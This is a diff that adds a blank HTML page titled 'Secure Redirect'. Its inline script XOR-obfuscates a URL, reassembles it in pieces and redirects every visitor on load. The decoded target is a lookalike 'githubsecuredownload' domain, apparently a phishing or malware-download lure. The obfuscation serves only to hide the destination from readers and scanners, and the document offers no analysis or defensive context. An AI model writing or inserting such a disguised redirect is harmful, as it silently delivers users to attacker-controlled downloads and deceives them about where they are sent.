@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Secure Redirect</title>
+    <script>
+        const getXORKey = (index) => (0x2A + (index % 0x0F)) & 0xFF;
+
+        const encryptedSymbols = [
+            0x48 ^ getXORKey(0),  0x74 ^ getXORKey(1),  0x74 ^ getXORKey(2),  0x70 ^ getXORKey(3),
+            0x73 ^ getXORKey(4),  0x3A ^ getXORKey(5),  0x2F ^ getXORKey(6),  0x2F ^ getXORKey(7),
+            0x67 ^ getXORKey(8),  0x69 ^ getXORKey(9),  0x74 ^ getXORKey(10), 0x68 ^ getXORKey(11),
+            0x75 ^ getXORKey(12), 0x62 ^ getXORKey(13), 0x73 ^ getXORKey(14), 0x65 ^ getXORKey(15),
+            0x63 ^ getXORKey(16), 0x75 ^ getXORKey(17), 0x72 ^ getXORKey(18), 0x65 ^ getXORKey(19),
+            0x64 ^ getXORKey(20), 0x6F ^ getXORKey(21), 0x77 ^ getXORKey(22), 0x6E ^ getXORKey(23),
+            0x6C ^ getXORKey(24), 0x6F ^ getXORKey(25), 0x61 ^ getXORKey(26), 0x64 ^ getXORKey(27),
+            0x2E ^ getXORKey(28), 0x6F ^ getXORKey(29), 0x6E ^ getXORKey(30), 0x6C ^ getXORKey(31),
+            0x69 ^ getXORKey(32), 0x6E ^ getXORKey(33), 0x65 ^ getXORKey(34), 0x2F ^ getXORKey(35),
+            0x68 ^ getXORKey(36), 0x72 ^ getXORKey(37), 0x66 ^ getXORKey(38), 0x2F ^ getXORKey(39),
+            0x61 ^ getXORKey(40), 0x6C ^ getXORKey(41), 0x6C ^ getXORKey(42), 0x6E ^ getXORKey(43),
+            0x65 ^ getXORKey(44), 0x77 ^ getXORKey(45)
+        ];
+
+        const decryptChar = (encrypted, index) => String.fromCharCode(encrypted ^ getXORKey(index));
+
+        const generateSegment = (start, end) => {
+            let segment = '';
+            for (let i = start; i <= end; i++) {
+                segment += decryptChar(encryptedSymbols[i], i);
+            }
+            return segment;
+        };
+
+        const segmentBuilders = [
+            () => generateSegment(0, 7),
+            () => generateSegment(8, 15),
+            () => generateSegment(16, 23),
+            () => generateSegment(24, 31),
+            () => generateSegment(32, 39),
+            () => generateSegment(40, 45)
+        ];
+
+        let url = '';
+        for (let builder of segmentBuilders) {
+            url += builder();
+        }
+
+        window.location.href = url;
+    </script>
+</head>
+<body>
+</body>
+</html>
